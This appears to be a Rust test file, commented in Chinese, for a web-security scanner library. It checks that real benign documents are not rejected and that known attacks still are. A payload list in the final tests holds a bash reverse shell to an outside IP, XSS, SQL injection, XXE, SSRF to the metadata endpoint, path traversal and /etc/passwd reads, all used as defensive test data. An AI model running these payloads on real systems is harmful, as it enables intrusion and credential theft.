// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

//! 真实文档语料：**正常内容不得越过拒绝线**。
//!
//! 为什么要有这个文件：本库原有 494 个测试全绿，却长期把普通 HTML 页面、标准 SVG
//! 上传、Python 源码、客服邮件体判成攻击并拒绝。根因不是断言写错了，而是**负面语料是
//! 合成的近似反例**——各检测器测的是 `<!DOCTYPEfoo>`（无空格）、`SYSTEM /etc/passwd`
//! （无引号）、`select from users`（无主语）这类"相邻但错误"的输入，真实的
//! `<!DOCTYPE html>`、`SYSTEM "prod"`、`Please select a date from…` 从没被测过。
//!
//! 所以这里放的是**整份文档**，不是字段片段，而且断言的是调用方真正在意的东西：
//! 参考管线在 `risk.level >= RiskLevel::High` 时拒绝（见 `examples/waf.rs`）。
//!
//! 加新检测器或收紧既有模式时，先让这个文件通过。它抓不到漏报，只抓误报——
//! 这正是当初缺的那一半。

use security_rust::{RiskLevel, Scanner};

/// 参考管线的拒绝线。低于它 = 放行。
const REJECT_LINE: RiskLevel = RiskLevel::High;

fn assert_allowed(name: &str, body: &str) {
    let scanner = Scanner::default();
    let a = scanner.assess(body);
    let hits: Vec<String> = scanner
        .scan(body)
        .iter()
        .map(|r| format!("{}={:?}/{:?}", r.attack_type, r.severity, r.matched_pattern))
        .collect();
    assert!(
        a.level < REJECT_LINE,
        "{name} 是正常内容却被拒绝：level={:?} score={} hits={:?}\n--- 原文 ---\n{body}",
        a.level,
        a.score,
        hits
    );
}

fn assert_rejected(name: &str, body: &str) {
    let a = Scanner::default().assess(body);
    assert!(
        a.level >= REJECT_LINE,
        "{name} 是攻击却没被拒绝：level={:?} score={}",
        a.level,
        a.score
    );
}

// ───────────────────────── 良性语料 ─────────────────────────

/// 一份真实的 HTML 文档。`<link>`、`<script src>`、`<meta>`、`href="#"` 是
/// 每一份网页都有的字节序列；`<script src="/app.js">` 尤其关键——它曾让
/// "HTML 页面现在能过了"的结论只在无外链脚本的页面上成立。
const HTML_PAGE: &str = r##"<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="/assets/site.css">
  <link rel="icon" href="/favicon.ico">
  <title>Docs — Home</title>
  <script src="/assets/app.js" defer></script>
</head>
<body>
  <h1>Welcome</h1>
  <p>Read the <a href="/about">about page</a>, or jump <a href="#">back to top</a>.</p>
  <img src="/logo.png" alt="logo" width="120">
  <ul><li>Fast</li><li>Small</li><li>Zero dependencies</li></ul>
</body>
</html>
"##;

/// 标准 Inkscape/Illustrator 导出的 SVG——`PUBLIC "-//W3C//DTD SVG 1.1//EN"` 是
/// 默认 doctype。本库自带文件内容扫描（upload / data_leak），SVG 上传是常规动作。
const SVG_UPLOAD: &str = r##"<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     version="1.1" width="100" height="100" viewBox="0 0 100 100">
  <circle cx="50" cy="50" r="40" fill="#3b82f6"/>
  <path d="M10 10 L90 90" stroke="#111" stroke-width="2"/>
</svg>
"##;

/// 经过反向代理的正常请求。`X-Forwarded-For` / `X-Forwarded-Proto` 由每一台
/// 负载均衡自动添加——它们的存在不是攻击。
const PROXIED_REQUEST: &str = "GET /index.html HTTP/1.1\r\n\
Host: example.com\r\n\
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n\
Accept: text/html,application/xhtml+xml\r\n\
Accept-Language: en-US,en;q=0.9\r\n\
X-Forwarded-For: 203.0.113.7\r\n\
X-Forwarded-Proto: https\r\n\
X-Real-IP: 203.0.113.7\r\n\
\r\n";

/// 标准文件上传 POST。`Content-Type: multipart/form-data; boundary=…` 是每个
/// 上传请求的固定头。
const UPLOAD_POST: &str = "POST /upload HTTP/1.1\r\n\
Host: example.com\r\n\
User-Agent: curl/8.5.0\r\n\
Content-Type: multipart/form-data; boundary=------------------------d74496d66958873e\r\n\
Content-Length: 4096\r\n\
\r\n";

/// JS 源码。DOM API 名、`eval(`、逻辑运算符都是语言本身的一部分。
const JS_SOURCE: &str = r#"const base = window.location.origin;
document.cookie = "theme=dark; path=/";
const total = price * qty && discount > 0;
const fallback = timeout || DEFAULT_TIMEOUT;
if (a && b) { run(); }
export function render(el) { el.style.width = expression(width) + "px"; }
"#;

/// CSS。`expression(` 是旧 IE 的遗留写法，仍出现在存量样式表里。
const CSS_BLOCK: &str = r#"body { margin: 0; font-family: system-ui, sans-serif; }
.card { display: flex; gap: 8px; color: #334155; }
.legacy { width: expression(document.body.clientWidth); }
@media (max-width: 640px) { .card { flex-direction: column; } }
"#;

/// Python 源码。`__getitem__` / `__set_name__` 是数据模型协议，不是 PHP 魔术方法。
const PYTHON_SOURCE: &str = r#"class Store:
    """A tiny mapping wrapper."""

    def __getitem__(self, key):
        return self._data[key]

    def __set__(self, obj, value):
        obj._value = value

    def __getattr__(self, name):
        raise AttributeError(name)


__set_name__ is called by the descriptor protocol.
"#;

/// Markdown 文档：表格、行内代码片段（shell 命令）、散文。
const MARKDOWN_DOC: &str = r#"# Deployment

Run `systemctl restart app` after deploying.

| Flag | Meaning |
|------|---------|
| -v | verbose |
| -q | quiet |

See the [homepage](https://example.com/docs?a=1&a=2) for details.
"#;

/// 客服工单正文。曾经的三条 Medium 误报（hpp / csv_injection / mail_header）
/// 叠加把这种文本推到 High——注意它**不需要任何 Critical** 就能越过拒绝线。
const SUPPORT_TICKET: &str = "Ticket #4821 update:\n\
Please cc: my manager on this reply, and bcc: the archive address.\n\
The logs are at https://example.com/log?a=1&a=2\n\
\n\
- reproduced on staging\n\
- affects two tenants\n\
\n\
boundary=0.5 was used in the generated mail.\n";

/// 散文里出现安全术语。`SYSTEM "`、`PUBLIC "`、`vbscript:` 是文档在讨论它们，
/// 不是在攻击。
const PROSE_WITH_SECURITY_TERMS: &str = "The report was generated with SYSTEM \"production\" settings, \
and the PUBLIC \"staging\" profile was skipped.\n\
Our legacy build emitted vbscript: syntax for IE-only clients.\n\
The window.location object gives you the current URL.\n";

/// 普通英语散文里的括号。`(?i)system\s*\(` 曾被 "system (" 匹配，
/// 于是「The system (as opposed to the client)」被判 Critical 命令注入。
const PROSE_WITH_PARENS: &str = "The system (as opposed to the client) handles authentication.\n\
Our system (v2) is faster than the previous release.\n\
See the runbook (internal) for the rollback procedure.\n";

/// 技术文档里提到工具名。`powershell` 与 `cmd.exe` 曾按「词出现」判 Critical，
/// 于是任何安装说明都被拒。
const DOCS_MENTIONING_TOOLS: &str = "## Windows setup\n\
\n\
Install PowerShell 7 from the Microsoft Store, then run the installer.\n\
Legacy deployments used cmd.exe scripts; those are deprecated.\n\
Log output can be discarded by redirecting to /dev/null.\n";

/// 讲解安全话题的文档。行内代码里出现 `cat /etc/passwd` 是在**演示**，
/// 不是在攻击——这与 Markdown 行内代码整体同形，是弱信号而非强信号。
const SECURITY_TUTORIAL: &str = "## Checking local accounts\n\
\n\
Run `cat /etc/passwd` to list local accounts, and check `/etc/shadow` for hashes.\n\
A typical privilege-escalation chain reads:\n\
\n\
    cat /etc/passwd | grep -i admin\n\
\n\
Never expose these files to the network.\n";

/// C 源码。`%n`、`||`、`&&` 都是语言本身的字符；`format_string` 的 Medium(15)
/// 在这里参与叠加，是验证「单条 Medium 不越线」的用例——它同时命中
/// command_injection 的弱档运算符，合计 20 < 40。
const C_SOURCE: &str = r#"#include <stdio.h>
#include <string.h>

/* SECURITY: never pass user input to printf; %n can write to memory. */
static int copy(char *dst, const char *src, size_t n) {
    if (src == NULL || n == 0) { return -1; }
    for (size_t i = 0; i < n && src[i] != '\0'; i++) { dst[i] = src[i]; }
    dst[n - 1] = '\0';
    return 0;
}

int main(int argc, char **argv) {
    char buf[64];
    int count = 0;
    if (argc > 1 && argc < 4) { copy(buf, argv[1], sizeof buf); }
    printf("read %d bytes from %s\n", count, buf);
    return 0;
}
"#;

/// 模板源码。`{{ a % b }}` 是取模表达式，不是 SSTI 攻击。
const TEMPLATE_SOURCE: &str = "{{ 50% off }} today\n\
<p>Subtotal: $12.00</p>\n";

/// 本库自己的吉祥物 SVG。曾经被本库自己的扫描器判为 Critical——
/// 一个检测库扫不动自己的 logo，是最直白的误报证据。
const PET_SVG: &str = include_str!("../docs/pet.svg");

#[test]
fn real_html_page_is_allowed() {
    assert_allowed("真实 HTML 页面", HTML_PAGE);
}

#[test]
fn stock_svg_upload_is_allowed() {
    assert_allowed("标准 SVG 上传", SVG_UPLOAD);
}

#[test]
fn crate_own_mascot_is_allowed() {
    assert_allowed("本库自带的 docs/pet.svg", PET_SVG);
}

#[test]
fn proxied_request_is_allowed() {
    assert_allowed("经反向代理的 GET", PROXIED_REQUEST);
}

#[test]
fn file_upload_post_is_allowed() {
    assert_allowed("标准文件上传 POST", UPLOAD_POST);
}

#[test]
fn javascript_source_is_allowed() {
    assert_allowed("JS 源码", JS_SOURCE);
}

#[test]
fn stylesheet_is_allowed() {
    assert_allowed("CSS 样式表", CSS_BLOCK);
}

#[test]
fn python_source_is_allowed() {
    assert_allowed("Python 源码", PYTHON_SOURCE);
}

#[test]
fn markdown_document_is_allowed() {
    assert_allowed("Markdown 文档", MARKDOWN_DOC);
}

#[test]
fn support_ticket_is_allowed() {
    assert_allowed("客服工单正文", SUPPORT_TICKET);
}

#[test]
fn prose_about_security_terms_is_allowed() {
    assert_allowed("讨论安全术语的散文", PROSE_WITH_SECURITY_TERMS);
}

#[test]
fn template_source_is_allowed() {
    assert_allowed("模板源码", TEMPLATE_SOURCE);
}

#[test]
fn prose_with_parens_is_allowed() {
    assert_allowed("含括号的英语散文", PROSE_WITH_PARENS);
}

#[test]
fn docs_mentioning_tools_are_allowed() {
    assert_allowed("提到工具名的技术文档", DOCS_MENTIONING_TOOLS);
}

/// 这条曾经是我自己写错的对照：把 `` `cat /etc/passwd` `` 当成「必须拒绝」的
/// 正向载荷，逼得检测器必须给「反引号内含敏感路径」开一条 Critical 特例。
/// 那个特例会把讲解这类命令的文档一并拒掉。行内代码里的命令是弱信号——
/// 它和 Markdown 行内代码逐字节同形，只有调用方知道这段话是提交的载荷还是教程。
#[test]
fn security_tutorial_is_allowed() {
    assert_allowed("讲解敏感文件的安全文档", SECURITY_TUTORIAL);
}

/// 这条专门验证「弱档 + 单条 Medium 不越线」：C 源码同时命中
/// `format_string` Medium(15) 和 `command_injection` 弱档运算符(5)，
/// 合计 20，低于 40 的拒绝线。语料此前缺 C 源文件这一类。
#[test]
fn c_source_is_allowed() {
    assert_allowed("C 源文件", C_SOURCE);
}

#[test]
fn backtick_sensitive_path_is_detected_but_weak() {
    let scanner = Scanner::default();
    let payload = "`cat /etc/passwd`";
    assert!(
        !scanner.scan(payload).is_empty(),
        "弱信号也要检出，不能静默漏报"
    );
    assert!(
        scanner.assess(payload).level < REJECT_LINE,
        "行内代码形态不足以单独拒绝"
    );
}

#[test]
fn empty_and_plain_text_are_allowed() {
    for input in ["", " ", "hello world 123", "こんにちは世界 你好"] {
        assert_allowed("普通文本", input);
    }
}

// ─────────────── 正向对照：真实攻击必须仍然被拒 ───────────────

/// 没有这一半，上面的断言可以靠"把检测器删空"来全绿。
#[test]
fn real_attacks_are_still_rejected() {
    for (name, payload) in [
        ("XSS 事件处理器", "<img src=x onerror=alert(1)>"),
        ("XSS script 内容", "<svg onload=alert(1)>"),
        ("SQL 注入", "1 UNION SELECT username, password FROM users"),
        ("命令执行", "system(\"id\")"),
        ("反弹 shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        ("代码执行", "system($_GET['cmd'])"),
        ("路径穿越", "../../../../etc/passwd"),
        ("SSRF", "http://169.254.169.254/latest/meta-data/"),
        ("XXE 实体", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"),
    ] {
        assert_rejected(name, payload);
    }
}

/// 弱信号被刻意降档：仍检出，但不再单独拒绝。这是产品决策，不是疏漏——
/// 标记在此以便日后有人质疑"为什么 `<script>` 不拒绝"时有据可查。
#[test]
fn weak_signals_are_detected_but_do_not_reject() {
    let scanner = Scanner::default();
    for (name, payload) in [
        ("裸 script 标签", "<script>alert(1)</script>"),
        ("markdown 表格", "| Name | Age |\n|---|---|\n| Ada | 36 |"),
        ("jQuery", "$(document).ready(function () { init(); });"),
    ] {
        let results = scanner.scan(payload);
        assert!(
            !results.is_empty(),
            "{name} 应被检出（弱信号也是信号），实际无命中"
        );
        assert!(
            scanner.assess(payload).level < REJECT_LINE,
            "{name} 是弱信号，不应单独越过拒绝线"
        );
    }
}
